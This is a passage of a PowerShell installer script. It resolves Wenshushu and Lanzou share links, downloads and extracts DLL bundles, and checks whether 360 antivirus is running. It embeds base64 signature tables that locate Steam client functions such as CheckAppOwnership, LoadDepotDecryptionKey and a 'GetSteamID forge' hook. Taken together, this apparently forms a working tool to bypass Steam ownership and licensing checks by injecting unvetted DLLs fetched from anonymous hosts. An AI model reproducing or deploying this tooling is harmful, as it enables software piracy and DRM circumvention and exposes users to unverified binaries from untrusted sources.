        $fid = ""
        try { $fid = [string]$list.data.fileList[0].fid } catch {}
        if ([string]::IsNullOrWhiteSpace($fid)) {
            $script:WssFailReason = "resolve-list " + (Get-WssSnap $list)
            return $null
        }
        $script:WssFailReason = "resolve-sign"
        $q = [char]34
        $signBody = '{' + $q + 'consumeCode' + $q + ':0,' + $q + 'type' + $q + ':1,' + (New-WssJsonKV 'ufileid' $fid) + '}'
        $sign = Invoke-WssJson -Url "https://www.wenshushu.cn/ap/dl/sign" -Body $signBody -Headers $hdr
        $url = ""
        try { $url = [string]$sign.data.url } catch {}
        if ([string]::IsNullOrWhiteSpace($url)) {
            $script:WssFailReason = "resolve-sign " + (Get-WssSnap $sign)
            return $null
        }
        try { $url = [Uri]::UnescapeDataString($url) } catch {}
        $script:WssFailReason = ""
        return $url
    } catch {
        $em = ""
        try { $em = [string]$_.Exception.Message } catch { $em = [string]$_ }
        if ([string]::IsNullOrWhiteSpace($script:WssFailReason) -or $script:WssFailReason -eq "resolve-mgr") {
            $script:WssFailReason = "resolve-ex " + $em + " " + (Get-WssSnap $null)
        }
        return $null
    }
}

function Fetch-WssDirectFromHk {
    return $null
}

function Download-WenshushuZipBundle([string]$ExtractDir) {
    $script:WssFailReason = "empty-url"
    if (-not $WenshushuShares -or -not $WenshushuShares.ContainsKey("bundle")) { return $false }
    $share = $WenshushuShares["bundle"]
    $shareUrl = [string]$share.url
    $direct = $null
    if (-not [string]::IsNullOrWhiteSpace($shareUrl)) {
        try { $direct = Resolve-WenshushuDirectUrl -ShareUrl $shareUrl -Pwd ([string]$share.pwd) } catch {}
    }
    if (-not $direct) {
        return $false
    }
    $zipTmp = Join-Path $TmpDir "wenshushu_dlls.zip"
    $wssUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    if (-not (Save-RemoteFile -Url $direct -OutFile $zipTmp -AllowNonPe -UserAgent $wssUa)) {
        $script:WssFailReason = "download"
        return $false
    }
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
        if (Test-Path $ExtractDir) { Remove-Item -Recurse -Force $ExtractDir -ErrorAction SilentlyContinue }
        [System.IO.Directory]::CreateDirectory($ExtractDir) | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipTmp, $ExtractDir)
        $ok = $true
        foreach ($dll in $dlls) {
            $hit = Get-ChildItem -Path $ExtractDir -Recurse -File -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -ieq $dll } | Select-Object -First 1
            if (-not $hit -or -not (Test-PeDllFile $hit.FullName)) { $ok = $false; break }
        }
        try { Remove-Item -Force $zipTmp -ErrorAction SilentlyContinue } catch {}
        if (-not $ok) { $script:WssFailReason = "zip-pe"; return $false }
        $script:WssFailReason = ""
        return $true
    } catch {
        $script:WssFailReason = "zip-pe"
        try { Remove-Item -Force $zipTmp -ErrorAction SilentlyContinue } catch {}
        return $false
    }
}

function Download-Component([string]$DllName, [string]$OutFile) {
    $alias = $null
    if ($dllAlias -and $dllAlias.ContainsKey($DllName)) { $alias = $dllAlias[$DllName] }
    if (-not $alias -or -not $LanzouShares -or -not $LanzouShares.ContainsKey($alias)) {
        return $false
    }
    $share = $LanzouShares[$alias]
    $shareUrl = [string]$share.url
    if ([string]::IsNullOrWhiteSpace($shareUrl)) { return $false }

    $maxTry = $LanzouDllMaxAttempts
    if ($maxTry -lt 1) { $maxTry = 1 }
    if ($maxTry -gt 20) { $maxTry = 20 }
    $sleepMs = $LanzouDllRetryMs
    if ($sleepMs -lt 200) { $sleepMs = 200 }

    for ($attempt = 1; $attempt -le $maxTry; $attempt++) {
        $direct = $null
        $why = "parse/timeout"
        try {
            $direct = Resolve-LanzouDirectUrl -ShareUrl $shareUrl -Pwd ([string]$share.pwd)
        } catch { $why = "exception" }
        if ($direct) {
            $why = "download empty/http"

            $inner = $null
            try { $inner = [string]$share.inner } catch { $inner = $null }
            if (-not [string]::IsNullOrWhiteSpace($inner)) {
                $zipTmp = "$OutFile.lz.zip"
                if (Save-RemoteFile -Url $direct -OutFile $zipTmp) {
                    try {
                        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
                        if (Test-Path $OutFile) { Remove-Item -Force $OutFile -ErrorAction SilentlyContinue }
                        $extractDir = "$OutFile.lz.dir"
                        if (Test-Path $extractDir) { Remove-Item -Recurse -Force $extractDir -ErrorAction SilentlyContinue }
                        [System.IO.Directory]::CreateDirectory($extractDir) | Out-Null
                        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipTmp, $extractDir)
                        $src = Join-Path $extractDir $inner
                        if (-not (Test-Path $src)) {
                            $hit = Get-ChildItem -Path $extractDir -Recurse -File -ErrorAction SilentlyContinue |
                                Where-Object { $_.Name -ieq $inner } | Select-Object -First 1
                            if ($hit) { $src = $hit.FullName }
                        }
                        if (Test-Path $src) {
                            Move-Item -Force $src $OutFile
                            try { Remove-Item -Recurse -Force $extractDir -ErrorAction SilentlyContinue } catch {}
                            try { Remove-Item -Force $zipTmp -ErrorAction SilentlyContinue } catch {}
                            if (Test-Path $OutFile) {
                                return $true
                            }
                        }
                    } catch {}
                    try { Remove-Item -Force $zipTmp -ErrorAction SilentlyContinue } catch {}
                    try { if (Test-Path "$OutFile.lz.dir") { Remove-Item -Recurse -Force "$OutFile.lz.dir" -ErrorAction SilentlyContinue } } catch {}
                }
            } else {
                if (Save-RemoteFile -Url $direct -OutFile $OutFile) {
                    return $true
                }
            }
        }
        if ($attempt -lt $maxTry) {
            Start-Sleep -Milliseconds $sleepMs
        }
    }
    return $false
}

function Test-360Installed {
    $targets = @("360sd", "360rp", "360rps", "360tray", "360safe", "zhudongfangyu")

    $running = Get-Process -ErrorAction SilentlyContinue | Where-Object {
        $targets -contains $_.ProcessName.ToLower()
    }
    if ($running) { return $true }

    $svcNames = @("360rp", "360rps", "ZhuDongFangYu")
    foreach ($sn in $svcNames) {
        $svc = Get-Service -Name $sn -ErrorAction SilentlyContinue
        if ($svc -and $svc.Status -eq "Running") { return $true }
    }

    return $false
}

function Close-Window {
    param([int]$Delay = 2)
    Hide-SetupProgress
    Start-Sleep -Seconds $Delay
    [Environment]::Exit(0)
}

$script:SigEmbedExact = @{
    "pattern/steamclient/86112382982fa855086f566b2fb8343290e798849029337dcfeecba0d5051b5e" = "WzB4ODI0MjhFMzddCm5hbWUgPSAiQkJ1aWxkQW5kQXN5bmNTZW5kRnJhbWUiCnJ2YSA9ICIweEQyMTkyMCIKc2lnID0gIjQ4IDhCIEM0IDU1IDQ4IDhEIDY4IEExIDQ4IDgxIEVDIEMwIDAwIDAwIDAwIDQ4IDg5IDcwIDE4IgoKWzB4QzM3RjJEOEVdCm5hbWUgPSAiQnVpbGREZXBvdERlcGVuZGVuY3kiCnJ2YSA9ICIweDRCNzNCMCIKc2lnID0gIjQ4IDhCIEM0IDRDIDg5IDQ4IDIwIDg5IDUwIDEwIDQ4IDg5IDQ4IDA4IDU1IDU3IgoKWzB4REI3OEI0QUVdCm5hbWUgPSAiQnVpbGRTcGF3bkVudkJsb2NrIgpydmEgPSAiMHg5RDg0RDAiCnNpZyA9ICI0QyA4OSA0QyAyNCAyMCA0QyA4OSA0NCAyNCAxOCA0OCA4OSA1NCAyNCAxMCA0OCA4OSA0QyAyNCAwOCA1NSA1MyA1NiA1NyA0MSA1NCA0MSA1NSA0MSA1NiA0MSA1NyA0OCA4RCBBQyAyNCBCOCBGRSBGRiBGRiIKClsweDY0QkY3QzQ1XQpuYW1lID0gIkNVdGxCdWZmZXJFbnN1cmVDYXBhY2l0eSIKcnZhID0gIjB4Q0Q1REQwIgpzaWcgPSAiNDggODkgNUMgMjQgMDggNTcgNDggODMgRUMgMzAgNDggOEIgRDkgOEQgN0EgMDEiCgpbMHgyRDk0NTkxOV0KbmFtZSA9ICJDVXRsTWVtb3J5R3JvdyIKcnZhID0gIjB4RTgyMzAiCnNpZyA9ICI0OCA4OSA1QyAyNCAxMCA1NyA0OCA4MyBFQyAzMCA4QiBGQSA0OCA4QiBEOSA4QiA1MSAwOCA4QiA0OSAxMCA4RCAwNCAzOSIKClsweDRCMUIxRDc3XQpuYW1lID0gIkNoZWNrQXBwT3duZXJzaGlwIgpydmEgPSAiMHg5QkY4QTAiCnNpZyA9ICI0OCA4QiBDNCA4OSA1MCAxMCA0OCA4OSA0OCAwOCA1NSA1MyIKCiMgTG9jYWwgb3ZlcmxheSAoQ1NVKTogc3RlYW1jbGllbnQtbGF5ZXIgR2V0U3RlYW1JRCBmb3JnZSBmb3IgQ29kZUZ1c2lvbi4KIyBSaXZhbCBtYXNrIHh4eD8/eHh4eHh4eHh4IChkaXNwIGhpZ2ggRkZGRikuIEltYWdlIFJWQSAweENFQkQwIChmaWxlIDB4Q0RGRDApIEAgc2hhIDg2MTEyMzgy4oCmClsweEI2OUUwRjQ4XQpuYW1lID0gIkdldFN0ZWFtSUQiCnJ2YSA9ICIweENFQkQwIgpzaWcgPSAiNDggOEIgODEgPz8gPz8gRkYgRkYgNDggODkgMDIgNDggOEIgQzIgQzMiCgpbMHgwNDY5MUIyM10KbmFtZSA9ICJDbG9zZUFwcENsb3VkIgpydmEgPSAiMHhBMjFFNTAiCnNpZyA9ICI0OCA4OSA1QyAyNCAxMCA1NyA0OCA4MyBFQyAzMCA4QiBGQSA0OCA4QiBEOSA4NSBEMiIKClsweDYxNzlFOEY5XQpuYW1lID0gIkNvbmZpZ1N0b3JlR2V0QmluYXJ5IgpydmEgPSAiMHg1QjlFMTAiCnNpZyA9ICI0MCA1MyA1NSA1NiA1NyA0OCA4MyBFQyAzOCA0OCA2MyBGQSA0OSA4QiBFOSIKClsweEFDNzZCNDdEXQpuYW1lID0gIkdldEFwcERhdGFGcm9tQXBwSW5mbyIKcnZhID0gIjB4NEE4RDgwIgpzaWcgPSAiNDAgNTMgNTUgNTYgNTcgNDEgNTYgNDEgNTcgNDggODEgRUMgNzggMDEgMDAgMDAiCgpbMHhBMTg1REI0N10KbmFtZSA9ICJHZXRBcHBJREZvckN1cnJlbnRQaXBlIgpydmEgPSAiMHg5NkY3MzAiCnNpZyA9ICI4QiA4MSAzMCAwRCAwMCAwMCA4MyBGOCBGRiA3NCA/PyIKClsweENDNzk1NDJDXQpuYW1lID0gIkdldE9yQWRkQXBwRGF0YSIKcnZhID0gIjB4NEFBMEMwIgpzaWcgPSAiNDggODMgRUMgNTggNDggOEIgMDUgPz8gPz8gPz8gPz8gNDggODkgNUMgMjQgNjggNDggODkgNkMgMjQgNzAiCgpbMHgzQjNBMEY5RF0KbmFtZSA9ICJHZXRQYWNrYWdlSW5mbyIKcnZhID0gIjB4NEFBMzYwIgpzaWcgPSAiNDggODkgNUMgMjQgMTggODkgNTQgMjQgMTAgNTUgNTYgNTcgNDggODMgRUMgMjAgNDQgOEIgNDkgMjAiCgpbMHgwMkRGMjNCQ10KbmFtZSA9ICJHZXRQaXBlQ2xpZW50IgpydmEgPSAiMHg4N0YwQjAiCnNpZyA9ICI4NSBEMiA3NCA/PyA0NCAwRiBCNyBDQSA0NCAzQiA0OSA2MCIKClsweEMzRTIwRTI5XQpuYW1lID0gIklQQ1Byb2Nlc3NNZXNzYWdlIgpydmEgPSAiMHg4N0U2QzAiCnNpZyA9ICI0OCA4OSA1QyAyNCAxOCA0OCA4OSA2QyAyNCAyMCA1NyA0MSA1NCA0MSA1NSA0MSA1NiA0MSA1NyA0OCA4MyBFQyAzMCIKClsweEVENUVEMEM4XQpuYW1lID0gIktleVZhbHVlc19GaW5kT3JDcmVhdGVLZXkiCnJ2YSA9ICIweEQwNEI5MCIKc2lnID0gIjQ4IDhCIEM0IDRDIDg5IDQ4IDIwIDU3IDQ4IDgxIEVDIDYwIDA0IDAwIDAwIgoKWzB4MjQzNEE4QkFdCm5hbWUgPSAiS2V5VmFsdWVzX1JlYWRBc0JpbmFyeSIKcnZhID0gIjB4RDA3OTIwIgpzaWcgPSAiNDggOEIgQzQgNDQgODggNDggMjAgNTUgNDggOEQgNjggQTkiCgpbMHhCMTNDMEMzRl0KbmFtZSA9ICJMb2FkRGVwb3REZWNyeXB0aW9uS2V5IgpydmEgPSAiMHg1QjlFMTAiCnNpZyA9ICI0MCA1MyA1NSA1NiA1NyA0OCA4MyBFQyAzOCA0OCA2MyBGQSA0OSA4QiBFOSIKClsweDMxRTQ5OTI3XQpuYW1lID0gIkxvYWRQYWNrYWdlIgpydmEgPSAiMHg0QTU1RDAiCnNpZyA9ICI0NCA4OSA0NCAyNCAxOCA1MyA1NSA1NiA1NyA0MSA1NSIKClsweEM0NTEwMzlEXQpuYW1lID0gIk1hcmtMaWNlbnNlQXNDaGFuZ2VkIgpydmEgPSAiMHg5Q0MzOTAiCnNpZyA9ICI0OCA4OSA1QyAyNCAyMCA4OSA1NCAyNCAxMCA1NSA1NiA1NyA0OCA4MyBFQyAyMCIKClsweDA2NjMxMDMwXQpuYW1lID0gIk9wdGVkSW5NYXNrIgpydmEgPSAiMHg1RTM3NDAiCnNpZyA9ICI4OSA1NCAyNCAxMCA1NSA1MyA1NiA1NyA0MSA1NCA0MSA1NSA0OCA4RCBBQyAyNCAzOCBGRiBGRiBGRiIKClsweDBGOTI2RDBBXQpuYW1lID0gIlBjaE1zZ05hbWVGcm9tRU1zZyIKcnZhID0gIjB4RDAyOUIwIgpzaWcgPSAiNDggODkgNUMgMjQgMDggNTcgNDggODMgRUMgMjAgOEIgRDkgRTggPz8gPz8gPz8gPz8iCgpbMHgxMDNCNTJBQV0KbmFtZSA9ICJQcm9jZXNzUGVuZGluZ0xpY2Vuc2VVcGRhdGVzIgpydmEgPSAiMHg5QjVFOTAiCnNpZyA9ICI0MSA1NiA0MSA1NyA0OCA4MyBFQyAzOCA4MyBCOSA5OCAyNCAwMCAwMCAwMCIKClsweDgzNkZGOUYwXQpuYW1lID0gIlJlY3ZQa3QiCnJ2YSA9ICIweDU5QzkxMCIKc2lnID0gIjQ4IDhCIEM0IDU1IDQ4IDhEIEE4IDk4IEY2IEZGIEZGIgoKWzB4NjgyMTFCNERdCm5hbWUgPSAiU2VuZENhbGxiYWNrVG9QaXBlIgpydmEgPSAiMHg5NzRDODAiCnNpZyA9ICI0OCA4OSA1QyAyNCAwOCA1NyA0OCA4MyBFQyAzMCA0MSA4QiBEOSA0MSA4QiBGOCIKClsweDdEMUVDNDE1XQpuYW1lID0gIlNwYXduUHJvY2VzcyIKcnZhID0gIjB4OUQ5QjMwIgpzaWcgPSAiNDggODkgNUMgMjQgMTggNEMgODkgNEMgMjQgMjAgNDggODkgNTQgMjQgMTAgNTUgNTYgNTcgNDEgNTQgNDEgNTUgNDEgNTYgNDEgNTcgNDggOEQgQUMgMjQgMzAgRkYgRkYgRkYiCg=="
    "pattern/steamui/af6ca9193dd6d502fad83d4a51ea29fe156699c2dfcf5739f9f70ca659d2b83d" = "WzB4RDA1RTI2QTJdCm5hbWUgPSAiQWRkUHJvdG9idWZBc0JpbmFyeSIKcnZhID0gIjB4OUJFNDAwIgpzaWcgPSAiNDAgNTMgNTUgNTYgNTcgNDggODMgRUMgMjggNDggOEIgMDUgPz8gPz8gPz8gPz8gNDggOEIgRjIiCgpbMHhFMjJGNzRCNF0KbmFtZSA9ICJCdWlsZENvbXBsZXRlQXBwT3ZlcnZpZXdDaGFuZ2UiCnJ2YSA9ICIweDVFMTJBMCIKc2lnID0gIjRDIDg5IDQ0IDI0IDE4IDQ4IDg5IDU0IDI0IDEwIDQ4IDg5IDRDIDI0IDA4IDU1IDUzIDU2IDU3IDQxIDU0IDQxIDU1IDQxIDU2IDQxIDU3IDQ4IDhEIDZDIDI0IEUxIgoKWzB4MjIxRjA2NjFdCm5hbWUgPSAiQ1N0ZWFtVUlBcHBDb250cm9sbGVyUnVuRnJhbWUiCnJ2YSA9ICIweDVGNjdEMCIKc2lnID0gIjQ4IDg5IDVDIDI0IDEwIDQ4IDg5IDZDIDI0IDE4IDU2IDU3IDQxIDU0IDQxIDU2IDQxIDU3IDQ4IDgzIEVDIDQwIDBGIDI5IDc0IDI0IDMwIgoKWzB4QjAzMEEwNjFdCm5hbWUgPSAiRmlsbEluQXBwT3ZlcnZpZXciCnJ2YSA9ICIweDVFNjI4MCIKc2lnID0gIjQ4IDg5IDU0IDI0IDEwIDQ4IDg5IDRDIDI0IDA4IDU1IDUzIDU2IDU3IDQxIDU0IDQxIDU1IDQxIDU2IDQxIDU3IDQ4IDhEIDZDIDI0IEUxIDQ4IDgxIEVDIEI4IDAwIDAwIDAwIgoKWzB4M0ZDNjg1NDZdCm5hbWUgPSAiR2V0QXBwQnlJRCIKcnZhID0gIjB4NUU4QjkwIgpzaWcgPSAiODkgNTQgMjQgMTAgNTMgNDggODMgRUMgNDAgNDggOEIgMDUgPz8gPz8gPz8gPz8iCgpbMHhDODlDRkE3NV0KbmFtZSA9ICJHZXRUb3BNYW5hZ2VyIgpydmEgPSAiMHg2MDVBQzAiCnNpZyA9ICI0OCA4QiAwNSA5OSA2NyBCMCAwMCBDMyIKClsweEJERTE2QkQ2XQpuYW1lID0gIkxvYWRNb2R1bGVXaXRoUGF0aCIKcnZhID0gIjB4ODcxREQwIgpzaWcgPSAiNDggODkgNUMgMjQgMTggNTUgNTYgNDEgNTcgNDggODMgRUMgNDAiCgpbMHhDN0Q1Q0FDRl0KbmFtZSA9ICJNYXJrQXBwQ2hhbmdlIgpydmEgPSAiMHg2NzA3QTAiCnNpZyA9ICI0OCA4MyBFQyA3OCA0OCA4QiAwNSA/PyA/PyA/PyA/PyA0OCA4OSA3NCAyNCA3MCIKClsweDE1MzQ3OUYwXQpuYW1lID0gIlJlcGVhdGVkRmllbGRVaW50MzJfQWRkIgpydmEgPSAiMHg2Q0E5RTAiCnNpZyA9ICI0OCA4OSA3NCAyNCAxMCA0OCA4OSA3QyAyNCAxOCA0MSA1NiA0OCA4MyBFQyAyMCA4QiAzMSA0OCA4QiBGOSA4QiA0OSAwNCIKClsweEQwNTVENkMwXQpuYW1lID0gIlNob3VsZFNob3dBcHBJbkxpYnJhcnkiCnJ2YSA9ICIweDVCNkZFMCIKc2lnID0gIjQwIDUzIDQ4IDgzIEVDIDIwIDQ4IDhCIDAxIDQ4IDhCIEQ5IEZGIDEwIDNEIEQ2IDBDIDA5IDAwIgo="
    "ipc/steamclient/86112382982fa855086f566b2fb8343290e798849029337dcfeecba0d5051b5e" = "W0lDbGllbnRVc2VyXQppbnRlcmZhY2VfaWQgPSAxCnZ0YWJsZV9ydmEgPSAiMHgxMkU2NTkwIgoKW0lDbGllbnRVc2VyLkdldFN0ZWFtSURdCm1ldGhvZF9pbmRleCA9IDEwCmZ1bmNIYXNoID0gIjB4RDZGQzMyMDAiCndyYXBwZXJfcnZhID0gIjB4NzdBRDAwIgpmZW5jZXBvc3QgPSAiMHhENzA1OENBNSIKYXJnYyA9IDAKCltJQ2xpZW50VXNlci5HZXRBcHBPd25lcnNoaXBUaWNrZXRFeHRlbmRlZERhdGFdCm1ldGhvZF9pbmRleCA9IDEwNQpmdW5jSGFzaCA9ICIweEM3RTcxMjQ1Igp3cmFwcGVyX3J2YSA9ICIweDc0MzQyMCIKZmVuY2Vwb3N0ID0gIjB4Qzg0NDk4NDAiCmFyZ2MgPSAyCgpbSUNsaWVudFVzZXIuUmVxdWVzdEVuY3J5cHRlZEFwcFRpY2tldF0KbWV0aG9kX2luZGV4ID0gMTIwCmZ1bmNIYXNoID0gIjB4MjVENkJCMUQiCndyYXBwZXJfcnZhID0gIjB4ODM4MEUwIgpmZW5jZXBvc3QgPSAiMHgyNjQ2QjY2MyIKYXJnYyA9IDIKCltJQ2xpZW50VXNlci5HZXRFbmNyeXB0ZWRBcHBUaWNrZXRdCm1ldGhvZF9pbmRleCA9IDEyMQpmdW5jSGFzaCA9ICIweEUwNDY4Q0I0Igp3cmFwcGVyX3J2YSA9ICIweDc1NjJFMCIKZmVuY2Vwb3N0ID0gIjB4RTBCODAyMDAiCmFyZ2MgPSAxCgpbSUNsaWVudFV0aWxzXQppbnRlcmZhY2VfaWQgPSA0CnZ0YWJsZV9ydmEgPSAiMHgxMkVCRkI4IgoKW0lDbGllbnRVdGlscy5HZXRBcHBJRF0KbWV0aG9kX2luZGV4ID0gMTkKZnVuY0hhc2ggPSAiMHgwOTYwN0VDNCIKd3JhcHBlcl9ydmEgPSAiMHg3NDIxODAiCmZlbmNlcG9zdCA9ICIweDBBRkU3NTUyIgphcmdjID0gMAoKW0lDbGllbnRVdGlscy5HZXRBUElDYWxsUmVzdWx0XQptZXRob2RfaW5kZXggPSAyNApmdW5jSGFzaCA9ICIweDJEM0QzOTQ3Igp3cmFwcGVyX3J2YSA9ICIweDczREZDMCIKZmVuY2Vwb3N0ID0gIjB4MkVERjVFRTYiCmFyZ2MgPSAzCg=="
}
$script:SigEmbedFallback = @{
    "pattern/steamclient" = "WzB4ODI0MjhFMzddCm5hbWUgPSAiQkJ1aWxkQW5kQXN5bmNTZW5kRnJhbWUiCnJ2YSA9ICIweDAiCnNpZyA9ICI0OCA4QiBDNCA1NSA0OCA4RCA2OCBBMSA0OCA4MSBFQyBDMCAwMCAwMCAwMCA0OCA4OSA3MCAxOCIKClsweEMzN0YyRDhFXQpuYW1lID0gIkJ1aWxkRGVwb3REZXBlbmRlbmN5IgpydmEgPSAiMHgwIgpzaWcgPSAiNDggOEIgQzQgNEMgODkgNDggMjAgODkgNTAgMTAgNDggODkgNDggMDggNTUgNTciCgpbMHhEQjc4QjRBRV0KbmFtZSA9ICJCdWlsZFNwYXduRW52QmxvY2siCnJ2YSA9ICIweDAiCnNpZyA9ICI0QyA4OSA0QyAyNCAyMCA0QyA4OSA0NCAyNCAxOCA0OCA4OSA1NCAyNCAxMCA0OCA4OSA0QyAyNCAwOCA1NSA1MyA1NiA1NyA0MSA1NCA0MSA1NSA0MSA1NiA0MSA1NyA0OCA4RCBBQyAyNCBCOCBGRSBGRiBGRiIKClsweDY0QkY3QzQ1XQpuYW1lID0gIkNVdGxCdWZmZXJFbnN1cmVDYXBhY2l0eSIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDg5IDVDIDI0IDA4IDU3IDQ4IDgzIEVDIDMwIDQ4IDhCIEQ5IDhEIDdBIDAxIgoKWzB4MkQ5NDU5MTldCm5hbWUgPSAiQ1V0bE1lbW9yeUdyb3ciCnJ2YSA9ICIweDAiCnNpZyA9ICI0OCA4OSA1QyAyNCAxMCA1NyA0OCA4MyBFQyAzMCA4QiBGQSA0OCA4QiBEOSA4QiA1MSAwOCA4QiA0OSAxMCA4RCAwNCAzOSIKClsweDRCMUIxRDc3XQpuYW1lID0gIkNoZWNrQXBwT3duZXJzaGlwIgpydmEgPSAiMHgwIgpzaWcgPSAiNDggOEIgQzQgODkgNTAgMTAgNDggODkgNDggMDggNTUgNTMiCgojIExvY2FsIG92ZXJsYXkgKENTVSk6IHN0ZWFtY2xpZW50LWxheWVyIEdldFN0ZWFtSUQgZm9yZ2UgZm9yIENvZGVGdXNpb24uCiMgUml2YWwgbWFzayB4eHg/P3h4eHh4eHh4eCAoZGlzcCBoaWdoIEZGRkYpLiBJbWFnZSBSVkEgMHhDRUJEMCAoZmlsZSAweENERkQwKSBAIHNoYSA4NjExMjM4MuKApgpbMHhCNjlFMEY0OF0KbmFtZSA9ICJHZXRTdGVhbUlEIgpydmEgPSAiMHgwIgpzaWcgPSAiNDggOEIgODEgPz8gPz8gRkYgRkYgNDggODkgMDIgNDggOEIgQzIgQzMiCgpbMHgwNDY5MUIyM10KbmFtZSA9ICJDbG9zZUFwcENsb3VkIgpydmEgPSAiMHgwIgpzaWcgPSAiNDggODkgNUMgMjQgMTAgNTcgNDggODMgRUMgMzAgOEIgRkEgNDggOEIgRDkgODUgRDIiCgpbMHg2MTc5RThGOV0KbmFtZSA9ICJDb25maWdTdG9yZUdldEJpbmFyeSIKcnZhID0gIjB4MCIKc2lnID0gIjQwIDUzIDU1IDU2IDU3IDQ4IDgzIEVDIDM4IDQ4IDYzIEZBIDQ5IDhCIEU5IgoKWzB4QUM3NkI0N0RdCm5hbWUgPSAiR2V0QXBwRGF0YUZyb21BcHBJbmZvIgpydmEgPSAiMHgwIgpzaWcgPSAiNDAgNTMgNTUgNTYgNTcgNDEgNTYgNDEgNTcgNDggODEgRUMgNzggMDEgMDAgMDAiCgpbMHhBMTg1REI0N10KbmFtZSA9ICJHZXRBcHBJREZvckN1cnJlbnRQaXBlIgpydmEgPSAiMHgwIgpzaWcgPSAiOEIgODEgMzAgMEQgMDAgMDAgODMgRjggRkYgNzQgPz8iCgpbMHhDQzc5NTQyQ10KbmFtZSA9ICJHZXRPckFkZEFwcERhdGEiCnJ2YSA9ICIweDAiCnNpZyA9ICI0OCA4MyBFQyA1OCA0OCA4QiAwNSA/PyA/PyA/PyA/PyA0OCA4OSA1QyAyNCA2OCA0OCA4OSA2QyAyNCA3MCIKClsweDNCM0EwRjlEXQpuYW1lID0gIkdldFBhY2thZ2VJbmZvIgpydmEgPSAiMHgwIgpzaWcgPSAiNDggODkgNUMgMjQgMTggODkgNTQgMjQgMTAgNTUgNTYgNTcgNDggODMgRUMgMjAgNDQgOEIgNDkgMjAiCgpbMHgwMkRGMjNCQ10KbmFtZSA9ICJHZXRQaXBlQ2xpZW50IgpydmEgPSAiMHgwIgpzaWcgPSAiODUgRDIgNzQgPz8gNDQgMEYgQjcgQ0EgNDQgM0IgNDkgNjAiCgpbMHhDM0UyMEUyOV0KbmFtZSA9ICJJUENQcm9jZXNzTWVzc2FnZSIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDg5IDVDIDI0IDE4IDQ4IDg5IDZDIDI0IDIwIDU3IDQxIDU0IDQxIDU1IDQxIDU2IDQxIDU3IDQ4IDgzIEVDIDMwIgoKWzB4RUQ1RUQwQzhdCm5hbWUgPSAiS2V5VmFsdWVzX0ZpbmRPckNyZWF0ZUtleSIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDhCIEM0IDRDIDg5IDQ4IDIwIDU3IDQ4IDgxIEVDIDYwIDA0IDAwIDAwIgoKWzB4MjQzNEE4QkFdCm5hbWUgPSAiS2V5VmFsdWVzX1JlYWRBc0JpbmFyeSIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDhCIEM0IDQ0IDg4IDQ4IDIwIDU1IDQ4IDhEIDY4IEE5IgoKWzB4QjEzQzBDM0ZdCm5hbWUgPSAiTG9hZERlcG90RGVjcnlwdGlvbktleSIKcnZhID0gIjB4MCIKc2lnID0gIjQwIDUzIDU1IDU2IDU3IDQ4IDgzIEVDIDM4IDQ4IDYzIEZBIDQ5IDhCIEU5IgoKWzB4MzFFNDk5MjddCm5hbWUgPSAiTG9hZFBhY2thZ2UiCnJ2YSA9ICIweDAiCnNpZyA9ICI0NCA4OSA0NCAyNCAxOCA1MyA1NSA1NiA1NyA0MSA1NSIKClsweEM0NTEwMzlEXQpuYW1lID0gIk1hcmtMaWNlbnNlQXNDaGFuZ2VkIgpydmEgPSAiMHgwIgpzaWcgPSAiNDggODkgNUMgMjQgMjAgODkgNTQgMjQgMTAgNTUgNTYgNTcgNDggODMgRUMgMjAiCgpbMHgwNjYzMTAzMF0KbmFtZSA9ICJPcHRlZEluTWFzayIKcnZhID0gIjB4MCIKc2lnID0gIjg5IDU0IDI0IDEwIDU1IDUzIDU2IDU3IDQxIDU0IDQxIDU1IDQ4IDhEIEFDIDI0IDM4IEZGIEZGIEZGIgoKWzB4MEY5MjZEMEFdCm5hbWUgPSAiUGNoTXNnTmFtZUZyb21FTXNnIgpydmEgPSAiMHgwIgpzaWcgPSAiNDggODkgNUMgMjQgMDggNTcgNDggODMgRUMgMjAgOEIgRDkgRTggPz8gPz8gPz8gPz8iCgpbMHgxMDNCNTJBQV0KbmFtZSA9ICJQcm9jZXNzUGVuZGluZ0xpY2Vuc2VVcGRhdGVzIgpydmEgPSAiMHgwIgpzaWcgPSAiNDEgNTYgNDEgNTcgNDggODMgRUMgMzggODMgQjkgOTggMjQgMDAgMDAgMDAiCgpbMHg4MzZGRjlGMF0KbmFtZSA9ICJSZWN2UGt0IgpydmEgPSAiMHgwIgpzaWcgPSAiNDggOEIgQzQgNTUgNDggOEQgQTggOTggRjYgRkYgRkYiCgpbMHg2ODIxMUI0RF0KbmFtZSA9ICJTZW5kQ2FsbGJhY2tUb1BpcGUiCnJ2YSA9ICIweDAiCnNpZyA9ICI0OCA4OSA1QyAyNCAwOCA1NyA0OCA4MyBFQyAzMCA0MSA4QiBEOSA0MSA4QiBGOCIKClsweDdEMUVDNDE1XQpuYW1lID0gIlNwYXduUHJvY2VzcyIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDg5IDVDIDI0IDE4IDRDIDg5IDRDIDI0IDIwIDQ4IDg5IDU0IDI0IDEwIDU1IDU2IDU3IDQxIDU0IDQxIDU1IDQxIDU2IDQxIDU3IDQ4IDhEIEFDIDI0IDMwIEZGIEZGIEZGIgo="
